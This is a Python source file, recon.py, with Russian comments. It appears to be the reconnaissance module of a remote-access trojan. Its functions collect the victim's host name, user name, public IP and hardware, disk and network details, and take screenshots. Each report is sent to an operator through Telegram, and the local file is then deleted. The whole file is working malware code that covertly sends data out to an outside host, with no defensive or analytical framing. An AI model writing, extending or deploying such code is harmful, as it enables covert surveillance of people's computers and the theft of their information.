# Файл: recon.py
import os
import platform
import socket
import psutil
import requests
import datetime
import wmi # <-- Инструмент для глубокого анализа Windows
from utils import send_telegram_document, send_status_to_operator, TEMP_PATH

# --- Вспомогательные функции ---
def bytes_to_gb(bts):
    """Конвертирует байты в гигабайты."""
    return round(bts / (1024**3), 2)

def get_public_ip():
    """Получает публичный IP-адрес через внешний сервис."""
    try:
        return requests.get('https://api.ipify.org', timeout=5).text
    except Exception:
        return "Не удалось определить"

# --- Функции-сборщики ---
def get_system_info():
    """Собирает основную информацию о системе и пользователе."""
    report = [
        f"Имя компьютера: {socket.gethostname()}",
        f"Текущий пользователь: {os.getlogin()}",
        f"Публичный IP: {get_public_ip()}",
        f"ОС: {platform.system()} {platform.release()} ({platform.version()})",
        f"Архитектура: {platform.machine()}",
    ]
    return "\n".join(report)

def get_cpu_info():
    """Собирает детальную информацию о процессоре."""
    report = [
        f"Процессор: {platform.processor()}",
        f"Физические ядра: {psutil.cpu_count(logical=False)}",
        f"Логические ядра: {psutil.cpu_count(logical=True)}",
    ]
    try:
        freq = psutil.cpu_freq()
        report.append(f"Частота (МГц): Макс={freq.max:.2f}, Мин={freq.min:.2f}, Текущая={freq.current:.2f}")
    except Exception:
        report.append("Частота: Не удалось определить")
    return "\n".join(report)

def get_memory_info():
    """Собирает информацию об оперативной памяти и файле подкачки."""
    mem = psutil.virtual_memory()
    swap = psutil.swap_memory()
    report = [
        "--- Оперативная память (RAM) ---",
        f"  Всего: {bytes_to_gb(mem.total)} GB",
        f"  Используется: {bytes_to_gb(mem.used)} GB ({mem.percent}%)",
        f"  Свободно: {bytes_to_gb(mem.available)} GB",
        "--- Файл подкачки (Swap) ---",
        f"  Всего: {bytes_to_gb(swap.total)} GB",
        f"  Используется: {bytes_to_gb(swap.used)} GB ({swap.percent}%)",
    ]
    return "\n".join(report)

def get_disk_info():
    """Собирает информацию о всех дисковых разделах."""
    report = ["--- Дисковые накопители ---"]
    try:
        partitions = psutil.disk_partitions()
        for part in partitions:
            usage = psutil.disk_usage(part.mountpoint)
            report.append(f"  Диск: {part.device} ({part.fstype})")
            report.append(f"    Точка монтирования: {part.mountpoint}")
            report.append(f"    Размер: {bytes_to_gb(usage.total)} GB (Использовано: {bytes_to_gb(usage.used)} GB, Свободно: {bytes_to_gb(usage.free)} GB)")
    except Exception as e:
        report.append(f"  Не удалось прочитать диски: {e}")
    return "\n".join(report)

def get_gpu_info():
    """Собирает информацию о видеокартах через WMI."""
    report = ["--- Видеокарты (GPU) ---"]
    try:
        c = wmi.WMI()
        gpu_info = c.Win32_VideoController()
        if not gpu_info:
            report.append("  Видеокарты не найдены.")
            return "\n".join(report)
        for i, gpu in enumerate(gpu_info, 1):
            report.append(f"  GPU #{i}: {gpu.Name}")
            if gpu.AdapterRAM:
                report.append(f"    Видеопамять: {bytes_to_gb(gpu.AdapterRAM)} GB")
            report.append(f"    Драйвер: {gpu.DriverVersion}")
    except Exception:
        report.append("  Не удалось получить информацию о GPU (возможно, не Windows).")
    return "\n".join(report)

def get_network_info():
    """Собирает информацию о всех сетевых интерфейсах."""
    report = ["--- Сетевые интерфейсы ---"]
    try:
        interfaces = psutil.net_if_addrs()
        for name, addrs in interfaces.items():
            report.append(f"  Интерфейс: {name}")
            for addr in addrs:
                if addr.family == socket.AF_INET: # IPv4
                    report.append(f"    IPv4: {addr.address} (Маска: {addr.netmask})")
                elif addr.family == socket.AF_INET6: # IPv6
                    report.append(f"    IPv6: {addr.address}")
                elif addr.family == psutil.AF_LINK: # MAC
                    report.append(f"    MAC-адрес: {addr.address}")
    except Exception as e:
        report.append(f"  Не удалось прочитать сетевые интерфейсы: {e}")
    return "\n".join(report)

# --- Главные функции модуля ---

def run_sysinfo_recon(ws, loop):
    """Основная функция, запускающая полный сбор информации."""
    send_status_to_operator(ws, loop, "Начинаю глубокий анализ системы...")
    try:
        report_content = [
            f"===== ПОЛНЫЙ ОТЧЕТ О СИСТЕМЕ: {socket.gethostname()} =====",
            f"Время создания отчета: {datetime.datetime.now():%Y-%m-%d %H:%M:%S}",
            "\n" + "="*20 + " ОБЩАЯ ИНФОРМАЦИЯ " + "="*20,
            get_system_info(),
            "\n" + "="*20 + " ЦЕНТРАЛЬНЫЙ ПРОЦЕССОР (CPU) " + "="*20,
            get_cpu_info(),
            "\n" + "="*20 + " ГРАФИЧЕСКИЙ ПРОЦЕССОР (GPU) " + "="*20,
            get_gpu_info(),
            "\n" + "="*20 + " ПАМЯТЬ " + "="*20,
            get_memory_info(),
            "\n" + "="*20 + " ДИСКИ " + "="*20,
            get_disk_info(),
            "\n" + "="*20 + " СЕТЬ " + "="*20,
            get_network_info(),
        ]

        # Сохраняем отчет в файл
        filepath = os.path.join(TEMP_PATH, f"full_recon_{socket.gethostname()}.txt")
        with open(filepath, "w", encoding="utf-8") as f:
            f.write("\n".join(report_content))

        # Отправляем в Telegram
        send_telegram_document(filepath, f"💻 Полный отчет о системе: {socket.gethostname()}")
        send_status_to_operator(ws, loop, "✅ Глубокий анализ завершен. Отчет отправлен.")
        os.remove(filepath)

    except Exception as e:
        send_status_to_operator(ws, loop, f"❌ Критическая ошибка при сборе информации: {e}")

def run_screenshot_recon(ws, loop):
    """Делает скриншот. Эта функция остается без изменений."""
    try:
        send_status_to_operator(ws, loop, "Создаю скриншот...")
        filepath = os.path.join(TEMP_PATH, f"screenshot_{datetime.datetime.now():%Y%m%d_%H%M%S}.png")
        from PIL import ImageGrab
        ImageGrab.grab().save(filepath)
        send_telegram_document(filepath, caption="📸 Скриншот")
        send_status_to_operator(ws, loop, "✅ Скриншот отправлен.")
        os.remove(filepath)
    except Exception as e:
        send_status_to_operator(ws, loop, f"❌ Ошибка скриншота: {e}")